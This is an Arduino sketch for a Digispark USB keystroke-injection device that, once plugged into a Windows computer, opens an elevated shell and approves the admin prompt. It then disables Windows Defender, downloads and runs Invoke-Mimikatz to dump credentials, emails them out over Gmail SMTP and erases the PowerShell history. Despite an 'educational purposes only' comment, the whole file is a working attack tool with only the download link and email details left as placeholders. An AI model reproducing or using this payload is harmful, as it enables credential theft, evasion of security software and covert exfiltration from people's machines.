/*
* author: brian mayo
* objetive: dump windows credentials using mimikatz
* note: this script is for educational purposes only
* usefull links:
* 	https://github.com/PowerShellMafia/PowerSploit#invoke-mimikatz
* 	http://digistump.com/wiki/digispark/tutorials/digikeyboard
* 	https://ducktoolkit.com/payload/?os_type=windows
*/

#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); // on-board led for model A
}

void loop() {
  DigiKeyboard.delay(10000); // wait 10 sec before start
  DigiKeyboard.sendKeyStroke(0); 
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // Win + X
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_A); // It would open cmd as Admin (or Powershell as Admin)
  DigiKeyboard.delay(2000); // this delay depends on the system response
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // select option 'yes'
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // confirm the prompt
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mode con:cols=18 lines=1 && color FE && powershell "); // minimize the cmd & open powershell 
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true"); // disable windows defender 
  DigiKeyboard.delay(500);
  // download the PS script and execute. create a direct download link for https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
  DigiKeyboard.println(F("Invoke-Expression (New-Object Net.WebClient).DownloadString('<direct download link to PS>'); $output = Invoke-Mimikatz -DumpCreds;"));
  DigiKeyboard.delay(500);
  // using gmail SMTP server to send the credentials
  DigiKeyboard.println(F("$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email>', '<password>'); $ReportEmail = New-Object System.Net.Mail.MailMessage"));
  DigiKeyboard.delay(500);
  // send the email and clear history
  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'mimikatz'; $ReportEmail.Body = $output; $SMTPInfo.Send($ReportEmail); Remove-Item (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("exit"); // exit powershell
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit"); // exit cmd
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); // power on led: ready to remove digispark
  DigiKeyboard.delay(10000);
}
